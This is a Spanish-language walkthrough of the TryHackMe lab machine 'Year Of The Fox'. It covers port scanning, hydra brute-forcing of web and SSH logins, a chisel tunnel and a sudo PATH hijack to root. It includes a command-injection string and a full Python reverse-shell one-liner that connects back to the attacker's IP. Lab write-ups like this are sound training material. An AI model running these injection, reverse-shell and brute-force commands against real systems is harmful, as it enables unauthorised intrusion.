---
title : "Year Of The Fox - Write Up - Español"
date : 2021-10-17T12:39:31+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "Máquina de nivel díficil en TryHackMe."
tags : ["hydra","RCE","chisel","PATH","TryHackMe"]
---

| Link | Nivel | Creador |
|------|-------|---------|
| [Aquí](https://tryhackme.com/room/yotf)  | Difícil  |  [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)  |

## Reconocimiento

Comencemos con un escaneo normal de nmap.

```bash
╰─ lanfran@parrot ❯ sudo nmap 10.10.174.23 -p- -sS --min-rate 5000 -n -Pn                                                                                                ─╯
[sudo] password for lanfran: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-17 12:33 CEST
Nmap scan report for 10.10.174.23
Host is up (0.083s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 24.37 seconds
```
¡Excelente! ¡Tenemos un servidor web y un servicio microsoft-ds funcionando!

Analicemos el servidor de archivos con `enum4linux`.

```bash
╰─ lanfran@parrot ❯ enum4linux 10.10.174.23                                                                                                                           ─╯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 17 12:34:44 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.174.23
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.174.23    |
 ==================================================== 
[...]
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)
[...]
```
¡Woho! ¡Más información! Ahora tenemos 2 usuarios:
	`Fox`
	`Rascal`

Vayamos ahora al servidor web. 

## Acceso inicial - Usuario

![login](login.png)

Ups, nos está solicitando una contraseña y un usuario, tal vez podamos forzarlo con `hydra` y los usuarios que encontramos antes...
```bash
╰─ lanfran@parrot ❯ hydra -l rascal -P /usr/share/wordlists/rockyou.txt -u  -s 80  10.10.174.23 http-head /                                                              ─╯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-17 12:38:59
[WARNING] http-head auth does not work with every server, better use http-get
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-head://10.10.174.23:80/
[STATUS] 3492.00 tries/min, 3492 tries in 00:01h, 14340907 to do in 68:27h, 16 active
[80][http-head] host: 10.10.174.23   login: rascal   password: marinel
```
¡Sí! ¡Funcionó! Ahora podemos iniciar sesión en la página y ver qué hay dentro _(Por cierto, no elimino la contraseña descifrada porque esta máquina cambia la contraseña en cada reinicio...)_

![loged](loged.png)

Mmm... Una página simple con un input...


Después de mucha investigación, podemos obtener una shell reversa a partir del input con este exploit:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("tu_ip",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 

-----

"\";echo "pega tu base64 payload aquí" | base64 -d | bash;\""
```
Ejecútelo con `Burp Suite` o incluso con `cURL`.

![exploited](exploit.png)

Y estamos dentro, ¡ahora podemos leer la flag de web!
```bash
www-data@year-of-the-fox:/var/www$ cat web-flag.txt 
THM{[REDACTADO]}
```
Investigando, encontré que el puerto `22` está abierto y escuchando, pero solo para la máquina local, ¡así que tenemos que crear un túnel y podemos atacarlo con fuerza bruta!
```bash
$ netstat -tulwn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     
tcp6       0      0 :::139                  :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::445                  :::*                    LISTEN     
udp        0      0 10.10.255.255:137       0.0.0.0:*                          
udp        0      0 10.10.174.23:137        0.0.0.0:*                          
udp        0      0 0.0.0.0:137             0.0.0.0:*                          
udp        0      0 10.10.255.255:138       0.0.0.0:*                          
udp        0      0 10.10.174.23:138        0.0.0.0:*                          
udp        0      0 0.0.0.0:138             0.0.0.0:*                          
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 10.10.174.23:68         0.0.0.0:*                          
raw6       0      0 :::58                   :::*                    7          
$ 
```
Creemos el túnel ahora con `chisel`. _Tenga en cuenta que chisel no está instalado en la máquina, así que tuve que cargar un binario estático._
```bash
[Máquina del atacante]

╰─ lanfran@parrot ❯ ./chisel server -p 4444 --reverse &                                                                                                                 ─╯
[1] 1717758
2021/10/17 12:56:35 server: Reverse tunnelling enabled                                                                                                                     
2021/10/17 12:56:35 server: Fingerprint V4me3/cc0B0GtMPIyoYclwAhXCzh24uFYKuxh3M+jcY=
2021/10/17 12:56:35 server: Listening on http://0.0.0.0:4444

--------
[Máquina de la victima]

www-data@year-of-the-fox:/tmp$ ./chisel client 10.9.4.36:4444 R:2222:127.0.0.1:22
2021/10/17 11:58:01 client: Connecting to ws://10.9.4.36:4444
2021/10/17 11:58:01 client: Connected (Latency 54.77722ms)
```
Genial, ya que ahora podemos ver el puerto abierto `22` en la máquina, en nuestro puerto local `2222`, usemos la fuerza bruta con el usuario `fox`.

```bash
╰─ lanfran@parrot ❯ hydra -l fox -P /usr/share/wordlists/rockyou.txt -u -s 2222 127.0.0.1 ssh                                                                           ─╯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-17 12:57:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344223 to do in 1350:41h, 16 active
[2222][ssh] host: 127.0.0.1   login: fox   password: roberto
```
¡Excelente! tenemos la contraseña, ahora iniciemos sesión a través de `ssh` y leamos la flag del usuario.

```bash
╰─ lanfran@parrot ❯ ssh -p 2222 fox@localhost                                                                                                                           ─╯
fox@localhost's password: 


	__   __                       __   _   _            _____         
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  < 
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\


                                                                  
fox@year-of-the-fox:~$ cat user-flag.txt 
THM{[REDACTADO]}
fox@year-of-the-fox:~$ 
```
## Root

Para escalar a root, necesitaremos encontrar una forma de explotar un binario, que podamos ejecutar con sudo.
```bash
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```
Algunas cosas están sucediendo aquí. El `secure_path` no está configurado, y tenemos un binario, que después de hacer un poco de reversing, podemos ver que está usando otro binario, `poweroff`.
```bash
╰─ lanfran@parrot ❯ strings shutdown                                                                                                                                                                    ─╯
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
poweroff.  <------- Aquí
```
Entonces, para recapitular, podemos crear un binario malicioso para que actúe como `poweroff` y establecer el `$PATH` en nuestro directorio de trabajo actual. ¡Hagamoslo!
```bash
fox@year-of-the-fox:/tmp$ cp /bin/bash poweroff
fox@year-of-the-fox:/tmp$ sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown
root@year-of-the-fox:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
¡Y lo conseguimos!
Ahora, para la flag de root restante, leamos el archivo que está en `/home/rascal/` y eliminemos todos los saltos de línea.
```bash
root@year-of-the-fox:/tmp# ls -la /home/rascal/
total 24
drwxr-x--- 2 rascal rascal 4096 Jun  1  2020 .
drwxr-xr-x 4 root   root   4096 May 28  2020 ..
lrwxrwxrwx 1 root   root      9 May 28  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rascal rascal  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 rascal rascal 3771 Apr  4  2018 .bashrc
-r-------- 1 rascal root    158 Jun  9  2020 .did-you-think-I-was-useless.root
-rw-r--r-- 1 rascal rascal  807 Apr  4  2018 .profile
root@year-of-the-fox:/tmp# cat /home/rascal/.did-you-think-I-was-useless.root | tr -d '\n'
THM{[REDACTADO]]}Here's the prize:YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo=Good luck!
```

¡Y hemos rooteado la máquina!

Eso es todo de mi parte, ¡espero que lo encuentre útil!